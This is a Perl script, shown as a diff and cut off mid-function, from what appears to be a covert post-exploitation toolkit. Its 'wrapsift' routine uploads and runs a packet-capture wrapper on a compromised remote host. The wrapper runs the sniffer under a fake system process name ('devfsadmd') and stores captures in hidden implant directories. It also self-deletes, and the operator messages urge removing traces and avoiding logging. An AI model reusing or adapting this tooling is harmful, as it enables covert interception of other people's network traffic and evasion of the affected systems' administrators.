@@ -1,0 +1,1328 @@
+#!/usr/bin/env perl 
+##
+$VER="1.3.0.6";
+
+$| = 1 ;
+my ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,$localpid,$localppid,
+    $serverver,$targetwdir,$targetos,$targetcwd,$targetpid,$targetppid,
+    $targetport,$output,$nopenlines,@lines)
+  =  ();
+
+myinit();
+
+myprep() unless $checkdebugonly or $lookforsift;
+
+lookforsift() if $lookforsift;
+
+my $taillines = 23;
+if ($checkdebugonly) {
+  if ($sift_filter =~ /^-{0,1}(\d+)$/) {
+    $taillines = int($1) if (int($1) > 0);
+  }
+}
+
+my ($failedinstances,$nopenlines,@failedinstances) =
+  doit("-get -v $sift_currentdir/.D*");
+
+if ($failedinstances) {
+  my $more = "";
+  foreach(@failedinstances) {
+    next if /exists, renaming to/;
+    s,.* -\. /,/,;
+    s,/current/+[^/]+/\.\./+([^/]+),/current/$1,;
+    next unless length;
+    $more .= "${COLOR_NORMAL}:::::::::::::::\n";
+    $more .= "$_\n";
+    $more .= ":::::::::::::::$COLOR_NOTE\n";
+    if (open(WRAPIN,$_)) {
+      while (<WRAPIN>) {
+	$more .= $_;
+      }
+      close(WRAPIN);
+    } else {
+      $more .= "COULD NOT FIND CONTENT:$failedinstances\n\n";
+    }
+  }
+  $more = "CONTENT OF FILES JUST DOWNLOADED:\n".$more
+    if $more;
+
+  mydie($COLOR_FAILURE.".\n".
+	"URGENT: A previous instance of the script has died and its error\n".
+	"        file was just downloaded (and popped up). You need to\n".
+	"        deal with it (report it). You also need to delete the file(s):\n\n".
+	"            rm $rmverbose $sift_currentdir/.D*\n\n".
+	$more
+       );
+}
+
+my ($siftdebugoutput) =
+  doit("-tail -$taillines $sift_debugdir/.dbg");
+
+if ($checkdebugonly) {
+  mydie(#$siftdebugoutput.
+	$COLOR_NOTE."\n".
+	"=====================================================\n".
+	"The $prog debug directory $sift_debugdir\n".
+	"already exists and the last $taillines lines of content\n".
+	"there in .dbg are shown above.\n".
+	"=====================================================\n".
+	"") if $siftdebugoutput;
+  ($siftdebugoutput) =
+    doit("-ls -d $sift_debugdir");
+  mydie(".\n\n\n".
+	"The debug directory is there, but there is no content")
+    if $siftdebugoutput;
+  offerabort
+    ("$COLOR_FAILURE\n\n".
+     "The debug directory does not exist. If you <C>ontinue here, $prog will\n".
+     "create it, then any running instance(s) of the script will begin logging to\n".
+     "the file \".dbg\" there. New output will come only once the next loop of the\n".
+     "script executes, i.e., either when sift is killed or turns over naturally at\n".
+     "its time or size limit.\n\n".
+     "If you <A>bort, the directory will not be made."
+    );
+  checkmkdir($sift_debugdir);
+  mydie(".\n\n\n\n".
+	"Try the -T option later to see any new debug content.\n\n".
+	"BUT DO NOT LEAVE THAT DIRECTORY THERE, DELETE IT BEFORE YOU LOG OFF!!".
+	"\n\n\n\n");
+}
+if ($siftdebugoutput) {
+  offerabort(#$siftdebugoutput.
+	     $COLOR_NOTE.
+	     ('='x78)."\n".
+	     "The $prog debug directory $sift_debugdir\n".
+	     "already exists and the last $taillines lines of content there in .dbg are shown above.\n".
+	     "This install is not in that file yet, it will proceed when you <C>ontinue.\n".
+	     ('='x78)."\n".
+	     "");
+}
+
+if ($sift_buildconfig) {
+    doconfigonly() ;
+}
+
+# Else: ASSERT: We are offering to upload/execute script/sift both
+
+my $width = 100;
+my $height = 74;
+
+($output) = doit("-ls $sift_currentdir/.$sift_outfile");
+if ($output) {
+    my ($result,$resultwas) = (lookforsift("quiet"));
+    unless($result =~ /No entries in/) {
+	mydie
+	    ($COLOR_FAILURE."\n\n".
+	     "$result\n\n".
+	     "It appears an instance of $prog with the same -o filename prefix is\n".
+	     "already in use. You cannot continue here using the same prefix. You\n".
+	     "can either: 1) clean up after the old/dead one and try again;\n".
+	     "            2) use the -B option to build a fresh config for the\n".
+	     "               instance that is still runing with that prefix; or\n".
+	     "            3) kill the instance running with that prefix, rename or\n".
+	     "               or download/delete the growing capture file shown\n".
+	     "               above and try again."
+	     );
+    }
+}
+
+($output) = doit("-ls $sift_bindir/$sift_runscriptas");
+if ($output) {
+    unless ($sift_unlink) {
+	offerabort("If you continue, the copy of $sift_runscriptas already there will be deleted\n".
+		   "and replaced with one containing the configuration you just asked for.");
+	my $dotfile = dotdotpathforfile("$sift_bindir/$sift_runscriptas");
+	doit("-rm $dotfile");
+    } else {
+	mydie("Unable to continue with wrapsift as executed,\n".
+	      "$sift_runscriptas already exists");
+    }
+}
+
+$killstring = dolocalecho
+  ($sift_scriptconfig.
+   $sift_scriptcontent.
+   $COLOR_FAILURE."\n".
+   "# ".gmtime()."\n#\n".
+   "About to upload/execute above script from:\n".
+   "  $opup/wrapsift.sh.LATEST\n".
+   "as\n".
+   "  $sift_bindir/$sift_runscriptas\n\n".
+   "Which will start sift as $sift_runas every $sift_runfor seconds, putting\n".
+   "output files in $sift_donedir.\n$COLOR_NORMAL\n".
+   "",
+   "popup -geometry ${width}x$height-0+0 -title \"$prog instance $sift_outfile ($sift_filter):_$nopen_rhostname\""
+  );
+doit("-lsh cat $opup/wrapsift.sh.LATEST",
+     "-lsh diff $opup/wrapsift.sh $opup/wrapsift.sh.LATEST",
+    );
+my $more = "$COLOR_FAILURE\n(Will be LEFT THERE, as you requested...)$COLOR_NORMAL"
+  unless ($sift_unlink);
+offerabort("About to upload above script (content also just popped up)$more from:\n".
+	   "  $opup/wrapsift.sh.LATEST\n".
+	   "as\n".
+	   "  $sift_bindir/$sift_runscriptas".
+	   "");
+
+doit("-put $opup/wrapsift.sh.LATEST $sift_bindir/$sift_runscriptas");
+preservefile("$opup/$sift_runscriptas");
+copy("$opup/wrapsift.sh.LATEST","$opup/$sift_runscriptas");
+my ($output,$nopenlines,@output,$moreproblem) = ();
+if ($targetshell =~ /bash/) {
+  ($output,$nopenlines,@output) = doit("-cd $sift_bindir","bash ./$sift_runscriptas &");
+} else {
+  ($output,$nopenlines,@output) = doit("-cd $sift_bindir","./$sift_runscriptas &");
+}
+
+if ($output =~ /TEST RUN returned 0 /) {
+  newhostvar("host_donotburn{$nopen_rhostname}","$prog $output");
+  newhostvar("host_wrapsiftcommand{$sift_intf $sift_filter}",$host_wrapsiftcommand{"$sift_intf $sift_filter"}."-gs wrapsift $origargs\n");
+  my ($content,$warning) = logtool
+    (
+     "WRAPSIFT",
+     "$VER",
+     "SUCCESSFUL",
+     "DEPLOYED",
+     "binary: $sift_binary cmd: -gs wrapsift $origargs",
+     undef,
+     "$opup/$sift_runscriptas",
+    );
+  
+} else {
+  my ($content,$warning) = logtool
+    (
+     "WRAPSIFT",
+     "$VER",
+     "FAILED",
+     "DEPLOYED",
+     "binary: $sift_binary ; kill: $sift_kill ;  cmd: -gs wrapsift $origargs",
+     undef,
+     "$opup/$sift_runscriptas",
+    );
+  $moreproblem = "\n$COLOR_FAILURE\nThe TEST RUN of the above wrapsift execution FAILED.";
+  if ($output =~ /FATAL: (\d+)/) {
+    my $errno = $1;
+    mydie("Cannot open $opup/wrapsift.sh")
+      unless open(SIFTIN,"$opup/wrapsift.sh");
+    while(my $line = <SIFTIN>) {
+      dbg("HERE:$line");
+      
+      next unless ($line =~ /die\s+$errno\s+/);
+      $line =~ s,.*die\s+$errno\s+,,;
+      $moreproblem =~ s/\.$/, ERR=$errno: $line/;
+      last;
+    }
+    close(SIFTIN);
+  }
+}
+unlink("$opup/$sift_runscriptas");
+
+
+($output,$nopenlines,@output) = doit("-ls $sift_bindir/$sift_runscriptas");
+
+if ($output and $sift_unlink) {
+  $moreproblem = "ALSO:\n\n".$moreproblem if $moreproblem;
+  mydie("The shell script is still there, something went wrong.$moreproblem");
+} elsif ($moreproblem) {
+  mydie($moreproblem);
+}
+if ($output) {
+  mygetinput("$COLOR_FAILURE\n".
+	     "FYI:  It looks like you told the script NOT to self-delete, and\n".
+	     "yes, it's still there:\n\n".
+	     $output."\n$COLOR_NORMAL\n".
+	    "Hit Enter to continue...");
+}
+$justdeployed++;
+my ($result,$resultwas) = (lookforsift());
+unless ($result =~ /kill -9 (\d+) (\d+)/) {
+  $resultwas = $result;
+  $result = "";
+}
+if ($result) {
+  progprint($result.
+	    "$COLOR_NORMAL\n\n\n".
+	    "The script uploaded, ran, self deleted (if told to) and the TEST RUN exited with\n".
+	    "no error, so it seems it all ran properly.\n\n".
+	    "The kill line above (followed by cleanup of the ./s directory) is how we will\n".
+	    "need to remove this instance later (unless the box reboots or the script exits\n".
+	    "at some later date with an error, so be sure those pids are still us).\n\n".
+	    "-gs wrapsift logged as follows via logtool():\n".
+	    "    binary: $sift_binary ; kill: $sift_kill ;  cmd: -gs wrapsift $origargs"
+	   );
+} else {
+  my $more = "";
+  $more = "lookforsift() RESULT (did not include kill line) WAS\n".
+    "$resultwas\n\n" if $resultwas;
+  progprint($more.
+	    "$COLOR_FAILURE\n".
+	    "There may be a problem, the check of the =ps output above could not find the\n".
+	    "SIFT and shell script PIDs, and yet the TEST RUN exited with no error, and the\n".
+	    "script uploaded and self deleted. Get help if you need it.\n\n"
+	   );
+}
+
+
+#if ($siftdebugoutput) {
+#  ($siftdebugoutput) =
+#    doit("-tail -20 $sift_debugdir/.dbg");
+#}
+# Called via do so must end with 1;
+1;
+
+sub lookforsift {
+  my ($output,@killpids) = doconfigonly(1);
+  my $count = @killpids/2; # There are two pids per
+  return $output if ($_[0] =~ /quiet/);
+  if (@killpids) {
+    my $more = "\n\n".
+      "To remove those instances entirely (don't forget to remove their\n".
+      "dotfiles, if any, in $sift_currentdir):\n\n".
+      "   kill -9 @killpids";
+    $more = "\n\n".
+      "To remove that instance entirely (don't forget to remove its\n".
+      "dotfile, if any, in $sift_currentdir):\n\n".
+      "   kill -9 @killpids"
+	if $count < 2;
+    $sift_kill = "kill -9 @killpids";
+    $output .= $more;
+  }
+dbg("killpids=(@killpids)");
+  mydie($output) unless  ($checkdebugonly or $justdeployed);
+  offerabort("$output\n\n".
+	     "Hit Enter to continue with -T/debug log tail"
+	    ) if ($checkdebugonly);
+  return $output;
+}
+
+sub doconfigonly {
+  local($recononly) = (@_);
+  my $scriptmatch = $sift_runscriptas;
+  # If this is a -l with no -X option, we just look for .sh,
+  # any -o str will do in front of it.
+  $scriptmatch = "\\\.sh" unless $opt_X_saved;
+  my ($psoutput,$nopenlines,@psoutput);
+  unless ($freebsdtarget) {
+    ($psoutput,$nopenlines,@psoutput) = doit("=ps");
+    ($pscmd) = $nopenlines =~ /\[(ps.*)\]/;
+#offerabort("HERE0(@_) with pscmd=$pscmd= and
+#nopenlines=$nopenlines=
+#
+#");
+  } else {
+    ($psoutput,$nopenlines,@psoutput) = doit("ps aluxww");
+    $pscmd = "ps aluxww";
+  }
+  return $pscmd if $recononly > 1;
+  my @sleeps = ();
+  my (@toolpids,%toollines,@toolppids,%toolplines) = ();
+  my (@shshpids,%shshlines,@shshppids,%shshplines) = ();
+  my (@sleeppids,%sleeplines,@sleepppids,%sleeppplines) = ();
+  my (@oursleeppids,%oursleeplines,,@oursleepppids,%oursleepppids) = ();
+  my (@ourpids) = ();
+  # Eliminate all $sift_runas guys whose parent is 1 (that is, this will not be us)
+dbg("Prior psoutput had ".scalar @psoutput." lines");
+dbg("we took out all these:\n".join("\n",grep  /\s1\s.*\s$sift_runas/, @psoutput));
+  # Remove $sift_runas if its parent is 1 and owner is root
+  @psoutput = grep ! /root\s+\d+\s+1\s.*\s$sift_runas/, @psoutput;
+dbg("after psoutput has ".scalar @psoutput." lines");
+
+  # We start with the beginning, the parent must look like this.
+  findpidsfor("sh .*$scriptmatch\$",
+	     #\@shshpids,
+	      \%shshlines,
+	     #\@shshppids,
+	      \%shshplines,
+	      "",
+	     @psoutput);
+  @shshpids = keys %shshlines;
+  @shshppids = keys %shshplines;
+  my @shshlines = values %shshlines;
+  my @shshplines = values %shshplines;
+
+  # Limit looking for $sift_runas or sleep to only those children of
+  # above sh .*sh match. Neat!
+  foreach my $pid (@shshpids) {
+dbg("Looking for:
+    findpidsfor(\"\\\\\\d\\\\\\s+$pid\\\\\\s.*\\\\\\s$sift_runas\",
+");
+    findpidsfor("\\\d\\\s+$pid\\\s.*\\\s$sift_runas",
+		#\@toolpids,
+		\%toollines,
+		#\@toolppids,
+		\%toolplines,
+		"",
+		@psoutput);
+    findpidsfor("\\\d\\\s+$pid\\\s.*sleep\\\s",
+		#\@sleeppids,
+		\%sleeplines,
+		#\@sleepppids,
+		\%sleepplines,
+		"",
+		@psoutput);
+  }
+  @toolpids = keys %toollines;
+  @toolppids = keys %toolplines;
+  my @toollines = values %toollines;
+  my @toolplines = values %toolplines;
+#  dbg("Outside of findpidsfor with
+#pids        =(@sleeppids)
+#pidlines    =(".join("\n              ",@sleeplines).")
+#parentpids  =(@sleepplines)
+#parentplines=(".join("\n              ",@sleepplines).")
+ 
+
+#");
+  @sleeppids = keys %sleeplines;
+  @sleepppids = keys %sleepplines;
+  my @sleeplines = values %sleeplines;
+  my @sleepplines = values %sleepplines;
+
+#  dbg("Outside of findpidsfor with
+#pids        =(@sleeppids)
+#pidlines    =(".join("\n              ",@sleeplines).")
+#parentpids  =(@sleepppids)
+#parentplines=(".join("\n              ",@sleepplines).")
+ 
+
+#");
+  
+  my $processmore = "";
+
+  if (scalar (@sleeplines) > 0) {
+    findpidsfor("sleep $sift_sleepfor",
+		#\@oursleeppids,
+		\%oursleeplines,
+		#\@oursleepppids,
+		\%oursleepplines,
+		"",
+		@sleeplines);
+    @oursleeppids = keys %oursleeplines;
+    @oursleepppids = keys %oursleepplines;
+    my @oursleeplines = values %oursleeplines;
+    my @oursleepplines = values %oursleepplines;
+    my $allours = 0;
+#    foreach (@sleeplines) {
+#      push(@oursleep
+    if ("@oursleeplines" eq "@sleeplines") {
+dbg("here0");
+      push(@ourpids,@sleeppids,@sleepppids);
+      my ($isa,$es,$es2,$warnmore) = ("is a","","es");
+      if (@oursleeplines > 1) {
+	($isa,$es,$es2) = ("are","es","");
+	$warnmore = "\nBE CAREFUL. Only one of these can be ours.\n\n";
+      }
+      $processmore .= "$COLOR_FAILURE\n\n".
+	join("\n",sort uniqify_array(@oursleeplines,@oursleepplines)).
+	"\n\n".
+	"There $isa sleep process$es that match$es2 the same delay you are asking for\n".
+	"with this new config.\n\n$warnmore".
+	"If you can confirm that is ours (the parent should be our shell script),\n".
+	"then killing that sleep will put your new config in place immediately.\n\n".
+	"            kill ".join("\n            kill ",@oursleeppids)."\n\n".
+	"";
+    } else {
+      dbg("here1 oursleeplines=(@oursleeplines) sleeplines=(@sleeplines)");
+      my $warnmore;
+      my ($isa,$es,$es2,$DOESNOT,$this) = ("is a","","","DOES NOT","this");
+      if (@sleeplines > 1) {
+      ($isa,$es,$es2,$DOESNOT,$this) = ("are","es","","DO NOT","one of these");
+	$warnmore = "\nBE CAREFUL. Only one of these can be ours.\n\n";
+      }
+
+      $processmore .= "$COLOR_FAILURE\n\n".
+	join("\n",sort uniqify_array(@sleeplines,@sleepplines)).
+	"\n\n".
+	"There $isa sleep process$es that $DOESNOT match$es2 the same delay you are\n".
+	"asking for with this new config.\n\n$warnmore".
+	"If you can confirm that $this is ours (the parent should be our shell script),\n".
+	"then killing that sleep will put your new config in place immediately.\n\n".
+	"            kill ".join("\n            kill ",@sleeppids)."\n\n".
+	"";
+
+    }
+  } else {
+    my ($s,$isa,$es,$es2,$DOESNOT,$this) = ("","is a","","","DOES NOT","this");
+    if (uniqify_array(@toollines,@toolplines) > 1) {
+      ($isa,$es,$es2,$DOESNOT,$this) = ("s","are","es","","DO NOT","one of these");
+    }
+    $processmore .= "\n\n".
+      join("\n",sort uniqify_array(@toollines,@toolplines)).
+      "\n\n".
+      "The line$s above match$es2 or are the parent of a process matching \"$sift_runas\"\n".
+      "If you can confirm that $this is ours (the parent should be our shell script),\n".
+      "then killing that $sift_runas process will put your new config in place\n".
+      "immediately.\n\n".
+      "            kill ".join("\n            kill ",@toolpids)."\n\n".
+	"";
+  }
+dbg("
+
+
+sleeplines    =(@sleeplines)
+sleepplines   =(@sleepplines)
+toollines     =(@toollines)
+toolplines    =(@toolplines)
+ourpids       =(@ourpids)
+sleeppids     =(@sleeppids)
+sleepppids    =(@sleepppids)
+
+");
+  my $result = "";
+  my (%linedone,@result) = ();
+  
+#    sort (uniqify_array(@sleeplines,@sleepplines,@toollines,@toolplines));
+  foreach my $line (@sleeplines,@sleepplines,@toollines,@toolplines) {
+    # At least one of these has a single element of multiple lines, so we split here
+    foreach my $line3 (split(/\n+/,$line)) {
+      next if $linedone{$line3}++;
+      push(@result,$line3);
+    }
+  }
+  $result = $COLOR_FAILURE."\n".
+    join("\n",sort @result)."\n\n".
+    $COLOR_NORMAL if @result;
+  my $something = length $result;
+dbg("something=$something=
+came from result=$result=");
+  if ($result) {
+    $result .=
+      "Above =ps entries in red match \"sleep $sift_sleepfor\" or \"$sift_runas\"\n".
+      "AND have a parent matching \"sh .*$scriptmatch\".";
+  } else {
+    $result .= $COLOR_FAILURE."No entries in =ps match \"sleep $sift_sleepfor\" or \"$sift_runas\"\n".
+      "that also have a parent matching \"sh .*$scriptmatch\".";
+    $result .= "\n\n".
+      "The line(s) shown here is(are) probably NOT $prog lines."
+	if $something;
+  }
+  return ($result,uniqify_array(@toolpids,@toolppids,@ourpids)) if $recononly;
+
+  offerabort
+    ($result.
+     " If this\n".
+     "configuration change entails CHANGING the tool name, you may not see any lines\n".
+     "matching \"$sift_runas\".\n\n".
+     "About to upload the following config entries as\n".
+     "$sift_currentdir/$sift_config:\n\n".
+     $sift_scriptconfig);
+
+  ($psoutput,$nopenlines,@psoutput) = doit("-ls $sift_currentdir/$sift_config");
+  if ($psoutput) {
+    doit("-cat $sift_currentdir/$sift_config");
+    offerabort
+      ("The file seems to be there already (see its content above). If you\n".
+       "continue, $prog will delete it first (you will have to answer YES),\n".
+       "and your configs (shown just above the -cat above) will go into place.");
+    doit("-rm $sift_currentdir/$sift_config");
+  }
+  doit("-put $opup/wrapsift.sh.LATEST.config $sift_currentdir/$sift_config");
+  mydie("Upload Done.\n\n".
+	"The file will get read by the remote script on its next loop or\n".
+	"you can kill the remote sift running and it will do so now.\n\n".
+	$COLOR_FAILURE.
+	"NOTE: Be sure to kill the right thing.\n\n".
+	$processmore.
+	"NOTE: Be sure to kill the right thing.\n\n".
+	""
+       );
+  exit;
+}
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0 unless $calledviarequire;
+  if ($willautoport and $socket) {
+    $calledviarequire = 1;
+  } else {
+    $prog = "-gs wrapsift";
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $vertext = "$prog version $VER\n" ;
+  }
+  clearallopts();
+  $vertext = "$prog version $VER\n" ;
+  mydie("No user servicable parts inside.\n".
+	"(I.e., noclient calls $prog, not you.)\n".
+	"$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			    -e $nopen_mylog);
+
+
+  ###########################################################################
+  # PROCESS ARGUMENTS
+  ###########################################################################
+
+
+  ## DEFAULTS
+  $def_E = "/bin/bash";
+  $def_M = 10;
+#  $def_P = 75;
+  $def_I = 7200;
+  $defIstr = $def_I / 60 / 60 ;
+  if ($defIstr > 1) {
+    $defIstr .= "h";
+  } else {
+    $defIstr = $def_I / 60 ;
+    $defIstr .= "m";
+  }
+
+  $def_Q = 0;
+  $defQstr = $def_Q / 60 / 60 ;
+  if ($defQstr > 1) {
+    $defQstr .= "h";
+  } else {
+    $defQstr = $def_Q / 60 ;
+    $defQstr .= "m";
+  }
+  $def_p = $def_I/4 -  $def_I/4 % 60 ;
+  $def_r = "devfsadmd";
+  $def_R = "";
+  $defpstr = $def_p / 60 . "m";
+  $def_b = "/tmp";
+  $def_f = 600;
+#  $def_o = "o";
+
+  setusagetexts();
+  my $origoptions = "@ARGV";
+  mydie("bad option(s)") if (! Getopts( "hvF:i:uM:P:d:s:S:D:Br:I:Tb:X:o:p:NLlmf:E:AC:j:ZwWQ:c:R:G:z:" ) );
+  $sift_snaplen = -1;
+  $sift_snaplen = int($opt_z) if (defined $opt_z);
+  if (defined $opt_z) {
+      mydie("Invalid syntax: -z $opt_z") unless
+	  ($opt_z == $sift_snaplen and 
+	   $sift_snaplen > 0);
+  }
+  $debug = $opt_Z;
+  $opt_X_saved=$opt_X;
+  $sift_wipeonmax = $opt_w ? "1" : "0";
+  $sift_wipeunder = $opt_G ? int($opt_G) : "0";
+  $sift_retryondie = $opt_W ? "0" : "1";
+  usage() if ($opt_h or $opt_v) ;
+  $socket = pilotstart(quiet);
+
+  mydie("\"-G $opt_G\" must be a positive integer")
+	if (defined $opt_G and ($opt_G <= 0 or $opt_G != $sift_wipeunder));
+  $sift_compress = $opt_C ? $opt_C : "";
+  $usebcmath = $opt_A;
+  $targetshell = defined $opt_E ? $opt_E : $def_E;
+  mydie("-E $opt_E must be a full path")
+    unless ($targetshell =~ m,^/.*/.+,);
+  undef $opt_E if ($targetshell eq $def_E);
+#  usage() if ($opt_h or $opt_v) ;
+#  $socket = pilotstart(quiet);
+  $maxfiles = defined $opt_f ? $opt_f : $def_f;
+  mydie("-f $opt_f option must be a positive integer")
+    unless ($maxfiles =~ /^\d+$/ and $maxfiles > 0);
+
+  $avoiddf = $opt_m;
+
+  if ($pcapfile = $opt_j) {
+    mydie("-j $pcapfile must be a non-empty local ascii file")
+      unless (-s $pcapfile);
+    my $test = `dos2unix $pcapfile 2>&1 ; file $pcapfile 2>&1`;
+    progprint("Running dos2unix $pcapfile ; file $pcapfile:\n\n".
+	      $test);
+    mydie("-j $pcapfile must be an ASCII file")
+      unless ($test =~ /ascii/i);
+    $sift_filter = readfile($pcapfile);
+    chomp($sift_filter);
+    $sift_filter =~ s,[\n\r], ,g;
+  } else {
+    $sift_filter = "@ARGV";
+  }
+  
+
+
+  $sift_intf = $opt_i;
+  $checkdebugonly = $opt_T;
+
+  mydie("PCAP_FILTER or -j PCAP_FILE and -i are required arguments unless -T or -l is used")
+    unless ($checkdebugonly or
+	    $opt_l or
+	    ($sift_filter and $sift_intf));
+
+  $sift_unlink = defined $opt_u ? 0 : 1; # Do unlink is the default
+
+
+  ($def_d,@more_d) =  @host_hiddendirs;
+
+  $def_b = $def_d unless $sift_unlink;
+  $sift_maxmeg  = defined $opt_M ? $opt_M : $def_M;
+  $sift_maxpct  = defined $opt_P ? $opt_P : $def_P;
+  $sift_outfile = defined $opt_o ? $opt_o : $def_o;
+  $sift_bindir  = defined $opt_b ? $opt_b : $def_b;
+
+  $sift_watchfor= defined $opt_R ? $opt_R : $def_R;
+  $sift_runas   = defined $opt_r ? $opt_r : $def_r;
+  $sift_runfor  = defined $opt_I ? $opt_I : $def_I;   # max runtime of sift
+  $sift_delayfor = defined $opt_Q ? $opt_Q : $def_Q;  # Idle between sifts
+  $sift_sleepfor  = defined $opt_p ? $opt_p : $def_p; # Idle if filesys full
+  $sift_buildconfig = $opt_B; # Default is full script
+
+  $sift_runfor = strtoseconds($sift_runfor);
+  $sift_sleepfor = strtoseconds($sift_sleepfor);
+  $sift_delayfor = strtoseconds($sift_delayfor);
+
+  $sift_moreargs   = "";
+  $sift_moreargs   .= defined $opt_N ? " -N" : "";
+  $sift_moreargs   .= defined $opt_L ? " -P" : "";
+  $sift_moreargs   .= " -S $sift_snaplen" if ($sift_snaplen > 0);
+  $lookforsift    = $opt_l;
+
+  $pscmd = "ps -ef";
+
+  ## ERROR CHECKING OF OPTS
+
+
+  if ($sift_moreargs =~ /P/) {
+    my $more = "\n         You should most likely abort here."
+      if $linuxtarget;
+    offerabort
+      ($COLOR_FAILURE.
+       "WARNING: Using promiscous mode with sift may log, especially on Linux.".
+       $more.
+       "");
+  }
+
+  # -o Required, drives other defaults
+  mydie("-o STR argument is required.\n".
+	"Each instance of wrapsift deployed requires a unique STR.")
+    unless ($sift_outfile or $lookforsift);
+  $def_o = $sift_outfile;
+  $def_X = "$def_o.sh";
+
+  $sift_runscriptas  = defined $opt_X ? $opt_X : $def_X;
+  $sift_config = "$sift_outfile.c";
+  mydie("Invalid -c \"$opt_c\", -c must be used only once and cannot contain whitespace")
+      if ($opt_c =~ /\s/);
+
+  if ($opt_c and $opt_c >= $sift_maxmeg) {
+      offerabort($COLOR_FAILURE."\n\nREAD CAREFULLY BEFORE CONTINUING!!\a\n$COLOR_NORMAL\n".
+		 "You are using -c value ($opt_c) >= -M value ($sift_maxmeg). With these settings, each\n".
+		 "collect file may grow to ${sift_maxmeg}M in size but$COLOR_FAILURE WILL NOT$COLOR_NORMAL ".
+		 "(repeat,$COLOR_FAILURE WILL NOT$COLOR_NORMAL) be split\n".
+		 "into smaller pieces. Use these settings with caution and only when such large\n".
+		 "files will not cause an issue when collected later, either manually or via\n".
+		 "some automated means.".
+		 "")
+	  if ($sift_maxmeg >= 40);
+      # Undefine opt_c if the split value is bigger than the collect to begin with.
+      undef $opt_c;
+  } else {
+    mydie("-M $sift_maxmeg is quite large, you must use -c ##\n(and use -c ## >= $sift_maxmeg to disable splitting on large files if desired)")
+        unless($opt_c or $sift_maxmeg < 40);
+  }
+  $sift_chopsize  = int($opt_c * 1024 * 1024); # option provided in MB, now in bytes
+  mydie("Invalid \"-c $opt_c\", must be a positive integer (number of megabytes)")
+      if (defined $opt_c and ($sift_chopsize < 1 or int($opt_c) != $opt_c or $opt_c !~ /^\d+$/));
+
+  # Non dir related errors
+  mydie("-I $opt_I argument is not valid")
+    unless $sift_runfor > 0;
+  mydie("-I $opt_I argument must be at least a minute")
+    unless $sift_runfor > 59;
+
+  mydie("-Q $opt_Q argument is not valid")
+    unless $sift_delayfor >= 0;
+
+  mydie("-p $opt_p argument is not valid")
+    unless $sift_sleepfor > 0;
+  mydie("-p $opt_p argument must be at least a minute")
+    unless ($lookforsift or $sift_sleepfor > 59);
+
+  mydie("-M $sift_maxmeg must be a positive integer")
+    unless ($sift_maxmeg =~ /^\d+$/ and $sift_maxmeg > 0);
+
+
+  mydie("-P MAXPCT is required--must be a positive integer at most 93")
+    unless ($lookforsift or $sift_maxpct > 0);
+
+  mydie("-P $sift_maxpct must be a positive integer at most 93")
+    unless ($lookforsift or ($sift_maxpct =~ /^\d+$/ and
+			     $sift_maxpct > 0 and
+			     $sift_maxpct <= 93));
+
+
+  # Dir related options/errors last
+  # Note: We ignore multiple hidden dirs if they are there.
+  # 
+  ($def_d,@more_d) =  @host_hiddendirs;
+
+  mydie("$prog requires a STOIC or INCISION hidden directory, this target has none")
+    unless $def_d;
+
+  $def_s = "$def_d/s";
+  $def_S = "$def_s/s";
+  $sift_donedir    = defined $opt_S ? $opt_S : $def_S;
+
+  my ($shelloutput) = doit("-ls -d $targetshell");
+  unless ($shelloutput =~ m,^-r.x.* $targetshell,) {
+    unless ($targetshell eq "/bin/sh") {
+      $targetshell = "/bin/sh";
+      ($shelloutput) = doit("-ls -d $targetshell");
+    }
+  }
+  mydie("Target shell $targetshell must be an executable file")
+    unless ($shelloutput =~ m,^-r.x.* $targetshell,);
+
+  unless ($opt_d or $lookforsift) {
+
+    # We bring this to their attention.
+    if (@host_hiddendirs > 1) {
+      my $colldirs = join("/$sift_donedir",@host_hiddendirs)."/$sift_donedir";
+      my ($wrapoutput,$n,@wrapoutput) = doit("-ls -d $colldirs");
+mydie("$wrapoutput,$n,@wrapoutput");
+      unless ($avoiddf) {
+	my @humanread = ("=df -h @host_hiddendirs");### if ($linuxtarget);
+	($wrapoutput,$n,@wrapoutput) = doit("=df @host_hiddendirs",@humanread);
+	@wrapoutput = uniqify_array(@wrapoutput);
+	$wrapoutput = join("\n",@wrapoutput);
+      }
+      my ($ans,$longans);
+      while (1) {
+	($ans,$longans) = mygetinput
+	  ($wrapoutput ."\n\n".
+	   "There are multiple hidden directory candidates (or ABORT):\n   ".
+	   join("\n   ",@host_hiddendirs)."\n\n".
+	   "Which do you want?",$def_d);
+	mydie("Aborted by user") if ($ans eq "a");
+	$longans =~ s,^\s*,,g;
+	next unless $host_hiddendirs{$longans};
+	last;
+      }
+      $def_d = $longans;
+      $def_s = "$def_d/s";
+      $def_S = "$def_s/s";
+    }
+  }
+
+  $def_D = "$def_d/d";
+  $sift_debugdir   = defined $opt_D ? $opt_D : $def_D;
+#  $sift_bindir     = defined $opt_b ? $opt_b : $def_b;
+  $sift_deploydir  = defined $opt_d ? $opt_d : $def_d;
+  $sift_deploydirexists = 0;
+  $sift_currentdir = defined $opt_s ? $opt_s : $def_s;
+  $sift_diedir     = "$sift_deploydir/D.$sift_outfile";
+
+
+  # Dir related errors
+  mydie("-b $sift_bindir (default=$def_b) must be a full path")
+    unless ($sift_bindir =~ m,^/,);
+
+  mydie("-d $sift_deploydir must be a full path")
+    unless ($sift_deploydir =~ m,^/.+/,);
+
+  mydie("-d $sift_donedir must be a full path (donedir)")
+    unless ($sift_donedir =~ m,^/.+/,);
+
+  mydie("-d $sift_currentdir must be a full path (currentdir)")
+    unless ($sift_currentdir =~ m,^/.+/,);
+
+  mydie("-D $sift_debugdir must be a full path")
+    unless ($sift_debugdir =~ m,^/.+/,);
+
+  $rmverbose = $linuxtarget ? "-v" : "";
+  $pscmd = doconfigonly(2);
+
+  my $previously = "";
+
+  my @checkbins = (
+		   "grep",
+		   "rm",
+		   "date",
+		   "rmdir",
+		   "mkdir",
+		   #			   "cd",
+		   "sed",
+		   "tr",
+		   "sleep",
+		   "echo",
+		   "mv",    );
+  push (@checkbins,$sift_compress) if ($sift_compress);
+      
+  unless($host_wrapsiftbinsconfirmed) {
+      foreach my $remotecmd (@checkbins) {
+	  my ($shelloutput) = nopenlss("-PQ",$remotecmd);
+	  mydie("Cannot continue, required remote command ($remotecmd) not available.")
